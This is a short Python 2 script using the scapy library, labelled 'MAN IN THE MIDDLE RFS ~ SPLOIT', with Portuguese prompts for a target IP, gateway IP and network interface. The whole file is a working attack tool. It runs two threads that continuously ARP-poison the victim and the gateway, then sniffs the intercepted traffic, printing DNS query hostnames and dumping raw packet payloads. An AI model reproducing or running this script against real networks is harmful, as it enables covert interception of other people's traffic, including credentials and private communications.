
from scapy.all import *
import threading,sys
print('##################################################################\n')
print ("\n\n MAN IN THE MIDDLE RFS ~ SPLOIT \n\n") 
print('##################################################################\n')
VIP = raw_input("[***]Ip: ") 
GW = raw_input("[***] IP do Gateway: ")
IFACE = raw_input("Nome da interface[ex eth0/ wlan0]:")
print('__________________________________________________________________\n')

def dnshandle(pkt):
 try:
     #print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n')
     host = 'Indefined'
     if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
          host = pkt.getlayer(DNS).qd.qname
          print("[*]"+VIP+" Host: "+host)
          send(pkt)

     if pkt.haslayer(Raw):
	  print('[**********]RAW HOST[%s]: \n'%host)
	  val =  str(pkt).encode('HEX')
	  decoded = str(val).decode('HEX')
	  print('[**********][+]Data Raw: \n %s \n'%decoded)
          print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n')  
 except:
   print('[-]Error:/n %s'%sys.exc_info()[0])
         

           
def v_poison():
     v = ARP(pdst=VIP,psrc = GW)
     while True:
             try:
                 send(v,verbose=0,inter=2,loop=1)
             except:
                 sys.exit(1) 
def gw_poison():
     gw = ARP(pdst=GW,psrc=VIP)
     while True:
             try:
                 send(gw,verbose=0,inter=1,loop=1)
             except:
                 sys.exit(1)
vthread = [] 
gwthread = [] 
while True:
      vpoison = threading.Thread(target=v_poison)
      vpoison.setDaemon(True)
      vthread.append(vpoison)
      vpoison.start()      
      gwpoison = threading.Thread(target=gw_poison)
      gwpoison.setDaemon(True)
      gwthread.append(gwpoison)
      gwpoison.start()
      pkt = sniff(iface=IFACE,filter='',prn=dnshandle)
    
      
